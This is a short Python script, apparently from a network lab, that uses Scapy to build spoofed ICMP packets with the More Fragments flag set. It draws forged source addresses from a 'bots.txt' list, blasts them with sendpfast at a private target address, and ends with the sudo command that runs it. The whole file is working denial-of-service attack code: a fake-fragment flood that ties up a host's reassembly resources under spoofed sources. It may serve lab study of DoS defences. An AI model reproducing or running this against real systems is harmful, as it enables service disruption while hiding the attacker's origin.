from scapy.all import *
import random
import time
import ipaddress

# ICMP Fake Frag
TARGET_IP = "192.168.100.2"
BOTFILE = "../bots.txt"
NUM_PACKETS = 100

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_icmp_fake_fragment():
    bot_ips = load_bots(BOTFILE)
    lista_de_pacotes = []

    # Fake Frag
    for _ in range(NUM_PACKETS):
        source_ip = random.choice(bot_ips)
        eth_layer = Ether()
        # flag MF
        frag = IP(src=source_ip, dst=TARGET_IP, flags="MF", frag=10)/ICMP(type=8, code=0)/Raw(b'FRAGPART')
        lista_de_pacotes.append(eth_layer / frag)

    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nSending completed.")
    print(f"Total time to send packets: {duration:.4f} seconds")

if __name__ == "__main__":
    run_icmp_fake_fragment()

# sudo PYTHONPATH=$HOME/scapy python3 icmp_fake_frag.py